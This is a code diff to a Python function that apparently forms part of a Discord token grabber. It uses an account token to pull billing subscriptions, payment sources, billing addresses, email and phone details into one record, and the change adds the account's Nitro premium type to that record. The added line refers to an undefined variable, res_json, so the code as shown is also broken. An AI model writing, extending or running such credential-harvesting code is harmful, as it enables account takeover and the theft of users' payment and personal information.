@@ -91,10 +91,12 @@ def token():
     res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
     nitro_data = res.json()
     hasNitro = bool(len(nitro_data) > 0)
+    type = 0
     if hasNitro:
         d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
         d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
         days_left = abs((d2 - d1).days)
+        type = res_json['premium_type']
     billing_info = []
     for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',headers=headers).json():
         y = x['billing_address']
@@ -205,6 +207,7 @@ def token():
         "username": username,
         "id": id,
         "verified": verified,
+        "premium_type": type,
         "email": email,
         "phone": phone,
         "avatar": avatar,
